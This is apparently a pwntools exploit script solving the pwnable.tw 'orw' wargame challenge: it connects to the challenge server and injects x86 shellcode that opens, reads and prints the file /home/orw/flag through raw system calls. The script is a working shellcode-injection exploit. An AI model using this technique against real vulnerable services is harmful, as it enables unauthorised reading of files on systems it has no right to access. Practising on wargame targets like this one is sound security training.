from pwn import *


context.binary = exe = ELF('./orw', checksec=False)
#p=process(exe.path)
p=remote("chall.pwnable.tw", 10001)

def GDB():
    gdb.attach(p,gdbscript=
        '''
        b*main
        '''
        )
    input()

shellcode=asm(
    '''
    push 0x6761
    push 0x6C662F77
    push 0x726F2F65
    push 0x6D6F682F

    mov eax,0x5
    mov ebx,esp
    mov ecx,0
    mov edx,0
    int 0x80

    mov ebx,eax
    mov eax,0x3
    mov ecx,esp
    mov edx,500
    int 0x80
    
    mov eax,0x4
    mov ebx,1
    int 0x80
    '''
    )
#GDB()
p.sendafter(b"shellcode:",shellcode)
p.interactive()
